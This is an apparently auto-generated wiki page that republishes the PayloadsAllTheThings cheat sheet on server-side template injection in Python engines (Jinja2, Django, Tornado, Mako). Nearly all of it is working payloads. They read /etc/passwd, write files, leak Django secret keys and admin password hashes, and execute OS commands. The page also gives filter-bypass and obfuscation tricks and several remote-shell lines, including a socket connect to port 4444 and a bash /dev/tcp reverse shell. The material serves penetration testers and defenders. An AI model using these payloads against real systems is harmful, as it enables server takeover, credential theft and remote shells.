---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Server Side Template Injection - Python

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-server-side-template-injection-python` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/Python.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Server Side Template Injection - Python](../../topics/server-side-template-injection/server-side-template-injection-python.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-server-side-template-injection-python |
| name | Server Side Template Injection - Python |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md |

## Preserved Source Material

````yaml
_body: "# Server Side Template Injection - Python\n\n> Server-Side Template Injection (SSTI)  is a vulnerability that arises\
  \ when an attacker can inject malicious input into a server-side template, causing arbitrary code execution on the server.\
  \ In Python, SSTI can occur when using templating engines such as Jinja2, Mako, or Django templates, where user input is\
  \ included in templates without proper sanitization.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n\
  - [Universal Payloads](#universal-payloads)\n- [Django](#django)\n    - [Django - Basic Injection](#django---basic-injection)\n\
  \    - [Django - Cross-Site Scripting](#django---cross-site-scripting)\n    - [Django - Debug Information Leak](#django---debug-information-leak)\n\
  \    - [Django - Leaking App's Secret Key](#django---leaking-apps-secret-key)\n    - [Django - Admin Site URL leak](#django---admin-site-url-leak)\n\
  \    - [Django - Admin Username and Password Hash Leak](#django---admin-username-and-password-hash-leak)\n- [Jinja2](#jinja2)\n\
  \    - [Jinja2 - Basic Injection](#jinja2---basic-injection)\n    - [Jinja2 - Template Format](#jinja2---template-format)\n\
  \    - [Jinja2 - Debug Statement](#jinja2---debug-statement)\n    - [Jinja2 - Dump All Used Classes](#jinja2---dump-all-used-classes)\n\
  \    - [Jinja2 - Dump All Config Variables](#jinja2---dump-all-config-variables)\n    - [Jinja2 - Read Remote File](#jinja2---read-remote-file)\n\
  \    - [Jinja2 - Write Into Remote File](#jinja2---write-into-remote-file)\n    - [Jinja2 - Remote Command Execution](#jinja2---remote-command-execution)\n\
  \        - [Forcing Output On Blind RCE](#jinja2---forcing-output-on-blind-rce)\n        - [Exploit The SSTI By Calling\
  \ os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)\n        - [Exploit The SSTI By Calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)\n\
  \        - [Exploit The SSTI By Calling Popen Without Guessing The Offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)\n\
  \        - [Exploit The SSTI By Writing an Evil Config File](#exploit-the-ssti-by-writing-an-evil-config-file)\n    - [Jinja2\
  \ - Remote Command Execution with Obfuscation](#jinja2---remote-command-execution-with-obfuscation)\n    - [Jinja2 - Filter\
  \ Bypass](#jinja2---filter-bypass)\n- [Tornado](#tornado)\n    - [Tornado - Basic Injection](#tornado---basic-injection)\n\
  \    - [Tornado - Remote Command Execution](#tornado---remote-command-execution)\n- [Mako](#mako)\n    - [Mako - Remote\
  \ Command Execution](#mako---remote-command-execution)\n    - [Mako - Remote Command Execution with Obfuscation](#mako---remote-command-execution-with-obfuscation)\n\
  - [References](#references)\n\n## Templating Libraries\n\n| Template Name | Payload Format |\n|---------------|----------------|\n\
  | Bottle        | `{{ }}`        |\n| Chameleon     | `${ }`         |\n| Cheetah       | `${ }`         |\n| Django   \
  \     | `{{ }}`        |\n| Jinja2        | `{{ }}`        |\n| Mako          | `${ }`         |\n| Pystache      | `{{\
  \ }}`        |\n| Tornado       | `{{ }}`        |\n\n## Universal Payloads\n\nGeneric code injection payloads work for\
  \ many Python-based template engines, such as Bottle, Chameleon, Cheetah, Mako and Tornado.\n\nTo use these payloads, wrap\
  \ them in the appropriate tag.\n\n```python\n__include__(\"os\").popen(\"id\").read() # Rendered RCE\ngetattr(\"\", \"x\"\
  \ + __include__(\"os\").popen(\"id\").read()) # Error-Based RCE\n1 / (__include__(\"os\").popen(\"id\")._proc.wait() ==\
  \ 0) # Boolean-Based RCE\n__include__(\"os\").popen(\"id && sleep 5\").read() # Time-Based RCE\n```\n\n## Django\n\nDjango\
  \ template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much\
  \ simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than\
  \ in Jinja2.\n\n### Django - Basic Injection\n\n```python\n{% csrf_token %} # Causes error with Jinja2\n{{ 7*7 }}  # Error\
  \ with Django Templates\nih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r\n```\n\n### Django - Cross-Site Scripting\n\
  \n```python\n{{ '<script>alert(3)</script>' }}\n{{ '<script>alert(3)</script>' | safe }}\n```\n\n### Django - Debug Information\
  \ Leak\n\n```python\n{% debug %}\n```\n\n### Django - Leaking App's Secret Key\n\n```python\n{{ messages.storages.0.signer.key\
  \ }}\n```\n\n### Django - Admin Site URL leak\n\n```python\n{% include 'admin/base.html' %}\n```\n\n### Django - Admin Username\
  \ And Password Hash Leak\n\n```ps1\n{% load log %}{% get_admin_log 10 as log %}{% for e in log %}\n{{e.user.get_username}}\
  \ : {{e.user.password}}{% endfor %}\n\n{% get_admin_log 10 as admin_log for_user user %}\n```\n\n---\n\n## Jinja2\n\n[Official\
  \ website](https://jinja.palletsprojects.com/)\n> Jinja2 is a full featured template engine for Python. It has full unicode\
  \ support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  \n\n### Jinja2 - Basic\
  \ Injection\n\n```python\n{{4*4}}[[5*5]]\n{{7*'7'}} would result in 7777777\n{{config.items()}}\n```\n\nJinja2 is used by\
  \ Python Web Frameworks such as Django or Flask.\nThe above injections have been tested on a Flask application.\n\n### Jinja2\
  \ - Template Format\n\n```python\n{% extends \"layout.html\" %}\n{% block body %}\n  <ul>\n  {% for user in users %}\n \
  \   <li><a href=\"{{ user.url }}\">{{ user.username }}</a></li>\n  {% endfor %}\n  </ul>\n{% endblock %}\n\n```\n\n### Jinja2\
  \ - Debug Statement\n\nIf the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context\
  \ as well as the available filters and tests. This is useful to see what’s available to use in the template without setting\
  \ up a debugger.\n\n```python\n<pre>{% debug %}</pre>\n```\n\nSource: [jinja.palletsprojects.com](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)\n\
  \n### Jinja2 - Dump All Used Classes\n\n```python\n{{ [].class.base.subclasses() }}\n{{''.class.mro()[1].subclasses()}}\n\
  {{ ''.__class__.__mro__[2].__subclasses__() }}\n```\n\nAccess `__globals__` and `__builtins__`:\n\n```python\n{{ self.__init__.__globals__.__builtins__\
  \ }}\n```\n\n### Jinja2 - Dump All Config Variables\n\n```python\n{% for key, value in config.iteritems() %}\n    <dt>{{\
  \ key|e }}</dt>\n    <dd>{{ value|e }}</dd>\n{% endfor %}\n```\n\n### Jinja2 - Read Remote File\n\n```python\n# ''.__class__.__mro__[2].__subclasses__()[40]\
  \ = File class\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}\n{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"\
  /tmp/flag\").read() }}\n# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398\n{{ get_flashed_messages.__globals__.__builtins__.open(\"\
  /etc/passwd\").read() }}\n```\n\n### Jinja2 - Write Into Remote File\n\n```python\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt',\
  \ 'w').write('Hello here !') }}\n```\n\n### Jinja2 - Remote Command Execution\n\nListen for connection\n\n```bash\nnc -lnvp\
  \ 8000\n```\n\n#### Jinja2 - Forcing Output On Blind RCE\n\nYou can import Flask functions to return an output from the\
  \ vulnerable page.\n\n```py\n{{\nx.__init__.__builtins__.exec(\"from flask import current_app, after_this_request\n@after_this_request\n\
  def hook(*args, **kwargs):\n    from flask import make_response\n    r = make_response('Powned')\n    return r\n\")\n}}\n\
  ```\n\n#### Exploit The SSTI By Calling os.popen().read()\n\n```python\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()\
  \ }}\n```\n\nBut when `__builtins__` is filtered, the following payloads are context-free, and do not require anything,\
  \ except being in a jinja2 Template object:\n\n```python\n{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()\
  \ }}\n{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}\n{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()\
  \ }}\n```\n\nWe can use these shorter payloads from [@podalirius_](https://twitter.com/podalirius_): [python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/):\n\
  \n```python\n{{ cycler.__init__.__globals__.os.popen('id').read() }}\n{{ joiner.__init__.__globals__.os.popen('id').read()\
  \ }}\n{{ namespace.__init__.__globals__.os.popen('id').read() }}\n```\n\nSimilar payloads could be used for Error-Based\
  \ and Boolean-Based exploitation:\n\n```python\n{{ cycler.__init__.__globals__.__builtins__.getattr(\"\", \"x\" + cycler.__init__.__globals__.os.popen('id').read())\
  \ }} # Error-Based\n{{ 1 / (cycler.__init__.__globals__.os.popen(\"id\")._proc.wait() == 0) }} # Boolean-Based\n```\n\n\
  With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This\
  \ is the shortest payload known to achieve RCE in a Jinja2 template:\n\n```python\n{{ lipsum.__globals__[\"os\"].popen('id').read()\
  \ }}\n```\n\n#### Exploit The SSTI By Calling subprocess.Popen\n\n:warning: the number 396 will vary depending of the application.\n\
  \n```python\n{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}\n\
  {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\n```\n\n#### Exploit The SSTI By Calling Popen Without\
  \ Guessing The Offset\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__\
  \ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\
  \"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\"\
  , \\\"flag.txt\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}\n```\n\nSimple modification of the payload to clean up\
  \ output and facilitate command input from [@SecGus](https://twitter.com/SecGus/status/1198976764351066113). In another\
  \ GET parameter include a variable named \"input\" that contains the command you want to run (For example: &input=ls)\n\n\
  ```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}\n\
  ```\n\n#### Exploit The SSTI By Writing An Evil Config File\n\n```python\n# evil config\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg',\
  \ 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }}\n\n# load the evil config\n{{ config.from_pyfile('/tmp/evilconfig.cfg')\
  \ }}  \n\n# connect to evil host\n{{ config['RUNCMD']('/bin/bash -c \"/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1\"',shell=True)\
  \ }}\n```\n\n### Jinja2 - Remote Command Execution with Obfuscation\n\nWrite the string: `id` using the index position of\
  \ a known existing string (the index value may vary depending on the target): `{{self.__init__.__globals__.__str__()[1786:1788]}}`.\n\
  \nExecute the system command `id`:\n\n```python\n{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}\n\
  ```\n\nReference and explanation of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).\n\
  \n### Jinja2 - Filter Bypass\n\n```python\nrequest.__class__\nrequest[\"__class__\"]\n```\n\nBypassing `_`\n\n```python\n\
  http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_\n\
  \n{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}\n{{request|attr([\"_\"*2,\"class\",\"\
  _\"*2]|join)}}\n{{request|attr([\"__\",\"class\",\"__\"]|join)}}\n{{request|attr(\"__class__\")}}\n{{request.__class__}}\n\
  ```\n\nBypassing `[` and `]`\n\n```python\nhttp://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_\n\
  or\nhttp://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_\n\
  ```\n\nBypassing `|join`\n\n```python\nhttp://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_\n\
  ```\n\nBypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [@SecGus](https://twitter.com/SecGus):\n\
  \n```python\n{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\\
  x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}\n\
  ```\n\n---\n\n## Tornado\n\n> Universal payloads also work for Tornado.\n\n### Tornado - Basic Injection\n\n```py\n{{7*7}}\n\
  {{7*'7'}}\n```\n\n### Tornado - Remote Command Execution\n\n```py\n{{os.system('whoami')}}\n{%import os%}{{os.system('nslookup\
  \ oastify.com')}}\n```\n\n---\n\n## Mako\n\n> Universal payloads also work for Mako.\n\n[Official website](https://www.makotemplates.org/)\n\
  > Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language,\
  \ which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and\
  \ flexible models available, while also maintaining close ties to Python calling and scoping semantics.\n\n```python\n<%\n\
  import os\nx=os.popen('id').read()\n%>\n${x}\n```\n\n### Mako - Remote Command Execution\n\nAny of these payloads allows\
  \ direct access to the `os` module\n\n```python\n${self.module.cache.util.os.system(\"id\")}\n${self.module.runtime.util.os.system(\"\
  id\")}\n${self.template.module.cache.util.os.system(\"id\")}\n${self.module.cache.compat.inspect.os.system(\"id\")}\n${self.__init__.__globals__['util'].os.system('id')}\n\
  ${self.template.module.runtime.util.os.system(\"id\")}\n${self.module.filters.compat.inspect.os.system(\"id\")}\n${self.module.runtime.compat.inspect.os.system(\"\
  id\")}\n${self.module.runtime.exceptions.util.os.system(\"id\")}\n${self.template.__init__.__globals__['os'].system('id')}\n\
  ${self.module.cache.util.compat.inspect.os.system(\"id\")}\n${self.module.runtime.util.compat.inspect.os.system(\"id\")}\n\
  ${self.template._mmarker.module.cache.util.os.system(\"id\")}\n${self.template.module.cache.compat.inspect.os.system(\"\
  id\")}\n${self.module.cache.compat.inspect.linecache.os.system(\"id\")}\n${self.template._mmarker.module.runtime.util.os.system(\"\
  id\")}\n${self.attr._NSAttr__parent.module.cache.util.os.system(\"id\")}\n${self.template.module.filters.compat.inspect.os.system(\"\
  id\")}\n${self.template.module.runtime.compat.inspect.os.system(\"id\")}\n${self.module.filters.compat.inspect.linecache.os.system(\"\
  id\")}\n${self.module.runtime.compat.inspect.linecache.os.system(\"id\")}\n${self.template.module.runtime.exceptions.util.os.system(\"\
  id\")}\n${self.attr._NSAttr__parent.module.runtime.util.os.system(\"id\")}\n${self.context._with_template.module.cache.util.os.system(\"\
  id\")}\n${self.module.runtime.exceptions.compat.inspect.os.system(\"id\")}\n${self.template.module.cache.util.compat.inspect.os.system(\"\
  id\")}\n${self.context._with_template.module.runtime.util.os.system(\"id\")}\n${self.module.cache.util.compat.inspect.linecache.os.system(\"\
  id\")}\n${self.template.module.runtime.util.compat.inspect.os.system(\"id\")}\n${self.module.runtime.util.compat.inspect.linecache.os.system(\"\
  id\")}\n${self.module.runtime.exceptions.traceback.linecache.os.system(\"id\")}\n${self.module.runtime.exceptions.util.compat.inspect.os.system(\"\
  id\")}\n${self.template._mmarker.module.cache.compat.inspect.os.system(\"id\")}\n${self.template.module.cache.compat.inspect.linecache.os.system(\"\
  id\")}\n${self.attr._NSAttr__parent.template.module.cache.util.os.system(\"id\")}\n${self.template._mmarker.module.filters.compat.inspect.os.system(\"\
  id\")}\n${self.template._mmarker.module.runtime.compat.inspect.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(\"\
  id\")}\n${self.template._mmarker.module.runtime.exceptions.util.os.system(\"id\")}\n${self.template.module.filters.compat.inspect.linecache.os.system(\"\
  id\")}\n${self.template.module.runtime.compat.inspect.linecache.os.system(\"id\")}\n${self.attr._NSAttr__parent.template.module.runtime.util.os.system(\"\
  id\")}\n${self.context._with_template._mmarker.module.cache.util.os.system(\"id\")}\n${self.template.module.runtime.exceptions.compat.inspect.os.system(\"\
  id\")}\n${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(\"id\")}\n${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(\"\
  id\")}\n${self.context._with_template.module.cache.compat.inspect.os.system(\"id\")}\n${self.module.runtime.exceptions.compat.inspect.linecache.os.system(\"\
  id\")}\n${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(\"id\")}\n${self.context._with_template._mmarker.module.runtime.util.os.system(\"\
  id\")}\n${self.context._with_template.module.filters.compat.inspect.os.system(\"id\")}\n${self.context._with_template.module.runtime.compat.inspect.os.system(\"\
  id\")}\n${self.context._with_template.module.runtime.exceptions.util.os.system(\"id\")}\n${self.template.module.runtime.exceptions.traceback.linecache.os.system(\"\
  id\")}\n```\n\nPoC :\n\n```python\n>>> print(Template(\"${self.module.cache.util.os}\").render())\n<module 'os' from '/usr/local/lib/python3.10/os.py'>\n\
  ```\n\n### Mako - Remote Command Execution with Obfuscation\n\nIn Mako, the following payload can be used to generates the\
  \ string \"id\": `${str().join(chr(i)for(i)in[105,100])}`.\n\nExecute the system command `id`:\n\n```python\n${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}\n\
  ```\n\n```python\n<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}\n```\n\nReference and explanation\
  \ of payload can be found [yeswehack/server-side-template-injection-exploitation](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation).\n\
  \n## References\n\n- [Cheatsheet - Flask & Jinja2 SSTI - phosphore - September 3, 2018](https://web.archive.org/web/20191029021639/http://pequalsnp-team.github.io:80/cheatsheet/flask-jinja2-ssti)\n\
  - [Exploring SSTI in Flask/Jinja2, Part II - Tim Tomes - March 11, 2016](https://web.archive.org/web/20170710015954/https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)\n\
  - [Jinja2 template injection filter bypasses - Sebastian Neef - August 28, 2017](https://web.archive.org/web/20180901222505/https://0day.work/jinja2-template-injection-filter-bypasses/)\n\
  - [Limitations are just an illusion – advanced server-side template exploitation with RCE everywhere - Brumens - March 24,\
  \ 2025](https://web.archive.org/web/20240906203847/https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)\n\
  - [Python context free payloads in Mako templates - podalirius - August 26, 2021](https://web.archive.org/web/20210826203322/https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/)\n\
  - [The minefield between syntaxes: exploiting syntax confusions in the wild - Brumens - October 17, 2025](https://web.archive.org/web/20251006113218/https://www.yeswehack.com/learn-bug-bounty/syntax-confusion-ambiguous-parsing-exploits)\n\
  - [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)"
_relative_path: Server Side Template Injection/Python.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/Python.md
````
